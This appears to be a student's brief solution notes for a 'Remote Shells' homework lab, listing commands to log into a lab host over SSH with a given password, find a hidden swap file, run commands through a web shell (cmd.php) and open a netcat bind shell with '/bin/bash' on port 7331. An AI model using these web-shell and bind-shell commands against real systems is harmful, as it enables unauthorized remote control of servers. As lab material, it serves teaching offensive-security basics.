## h 6.1 p
```bash
ssh student@192.168.100.106 #Password: pjatk
lynx 192.168.200.156
```

## h 6.2 p
```bash
lynx 192.168.200.156
#Open the hidden .command.txt.swp file from the directory listing
```

## h 6.3 p
```bash
#Quit Lynx with q, then run on student@remote-shells-homework:
curl 'http://192.168.200.156/cmd.php?c=id%20webadmin'
```

## h 6.4 p
```bash
#Remote Shells HOMEWORK - terminal 1:
curl 'http://192.168.200.156/cmd.php?c=nc+-e+/bin/bash+-lvp+7331'

#Remote Shells HOMEWORK - terminal 2:
nc 192.168.200.156 7331
```
